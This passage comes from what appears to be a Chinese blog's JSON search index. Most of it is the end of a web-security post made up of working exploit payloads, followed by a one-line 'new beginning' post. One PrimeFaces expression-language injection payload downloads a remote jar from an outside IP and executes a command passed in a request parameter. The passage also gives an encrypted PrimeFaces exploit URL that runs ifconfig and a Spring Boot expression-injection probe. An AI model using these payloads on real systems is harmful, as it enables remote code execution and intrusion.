${request.getSession().setAttribute(&quot;list&quot;,&quot;&quot;.getClass().forName(&quot;java.util.ArrayList&quot;).newInstance())}${request.getSession().getAttribute(&quot;list&quot;).add(request.getSession().getServletContext().getResource(&quot;/&quot;).toURI().create(&quot;http://118.184.23.145/cmd.jar&quot;).toURL())}${facesContext.getExternalContext().getResponse().getWriter().println(request.getSession().getClass().getClassLoader().getParent().newInstance(request.getSession().getAttribute(&quot;list&quot;).toArray(request.session.servletContext.getClass().getClassLoader().getParent().getURLs())).loadClass(&quot;org.javaweb.test.HelloWorld&quot;).newInstance().exec(request.getParameter(&quot;cmd&quot;)))}${facesContext.getExternalContext().getResponse().getWriter().flush()}${facesContext.getExternalContext().getResponse().getWriter().close()} 加密的Payload调用: http://xx.xx.xx.xx/javax.faces.resource/?pfdrt=sc&amp;;ln=primefaces&amp;;pfdrid=1acBqv16SJhfc30NLxL/NinZaDI%2BoHqk1xDbSI8qOl4%2BoXsKFyqJq3gv2IBc1S89q6G1POSSKDNlzHE/%2BnsMuZgTDALpyOstkBkFVJNc2U/B%2BoceOqnpF5YZoWtF0W7qGxsImsumut7GQoKKMQcbwwL4coE07x6Mn09hfy94tuiiy6S8S1vr8kPPYzrUC5AveiE9ls7dLDiaQripnC0Z71fB1xCjkxw8wjZt3om1PT9Wq8YAqkHuBIo/soFBvM1YDnJosELhjmfoJdAGBRfullXUfVw5xEg9ykFpLaKugkbDIBgXtv58Xu4BrT0d5MAQ8BOVwjzSodkdllYCAeUklCDWRfFtZDORdcAzXVxTRkEn%2Bnx7qAFh8NwK/sDsXz6U1Q2Q/ny1UaEMFM9qrgVmfX181HXWc4TuETxLqUohfreYLJLW%2BAxcxzciqqoKj%2Bht/KJ%2B%2BGfzuNoSs0E9i9N/AL5PALrdTRg%2BuweD3CMLZgLDITkMx4z7dmP2daw2B98nrKOLHtG6nYDcDmSfy8d8IKMZJvuq/WT7JLm0PJ3UqDyvzHHjrPCDpTFhMUmftFFvi4APBpT41slHYoRKDbJMvU/upvKyAsy5xQKJ5s6x%2B4F%2By9p8Icp1TQfMcqIPwMQkvsOs8i61m6i96dpmxpfZPWprcigaWMhJG8/iYRg7ZygegrmSbovLy5Tr3Mc9GODgdTx7v396NJ75yQyU4ETmYEhNxWTIoncK7MbyBcIWR/h1GjhCwwpquKRWLb3hal8DNJxubaKnxGa9mRNaQAZRr0s%2B3eo1jeino5O8CSQzla7ACpJc3867AAGxnWrnE/weJ20W3QKj6nIz/EAyx87aVIKs%2BQH3O4IGx%2BuiZ38TvMeg6jZpkZGiRNEUEuAoV6CWlMA%2BxM6BPvbPyWsqmdI8l%2ByFBhsoSpNhel2%2B0gxS5wWqZbRyi0rjPlOzUe8Xir9mlpuBZzrUIcbaYaE8PHQno1OZ/zaHx/GzAJakSRQ5YbKQ/W/OzkokDG3M79KSCtx2jN92PtISucY%3D&amp;;cmd=ifconfig Spring Boot框架表达式注入漏洞影响Spring Boot版本从1.1-1.3.0 http://localhost:8555/test.php?id=${new%20java.lang.String(new%20byte[]{101, 108, 105, 110, 106, 101, 99, 116 })} 内容中出现 elinject就是注入成功","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"新的开始！","slug":"新的开始！","date":"2018-09-17T16:32:10.000Z","updated":"2019-03-12T02:57:01.176Z","comments":true,"path":"2018/09/新的开始！/","link":"","permalink":"/2018/09/新的开始！/","excerpt":"","text":"记录自己某些时候的学习，和某些突发奇想。简而言之就是为了防止忘记某些自己需要的东西。","categories":[],"tags":[]}]}